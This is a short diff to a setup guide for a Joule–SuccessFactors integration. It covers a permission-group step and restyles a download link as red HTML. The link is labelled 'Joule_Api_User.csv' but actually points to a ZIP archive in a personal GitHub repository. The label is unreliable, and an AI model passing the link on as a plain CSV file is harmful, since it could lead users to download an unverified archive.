@@ -19,4 +19,7 @@ Status, UserId, Username, FirstName, LastName, Email ID, Manager (as NO_MANAGER 
 
 15. Assign this permission role to a permission group in SuccessFactors.  Ensure the newly created user is also a member of this group.
 
-****Download Api User** [**Joule_Api_User.csv**](https://github.com/vishnucse523/Joule_SuccessFactors/raw/refs/heads/main/joule_integration_sfsf_public-main/Create_API_User/API_User.zip) that contains Api User.
+<b><span style="color:red;">Download Api User</span></b> 
+<a href="https://github.com/vishnucse523/Joule_SuccessFactors/raw/refs/heads/main/joule_integration_sfsf_public-main/Create_API_User/API_User.zip">
+<b>Joule_Api_User.csv</b>
+</a> that contains Api User.
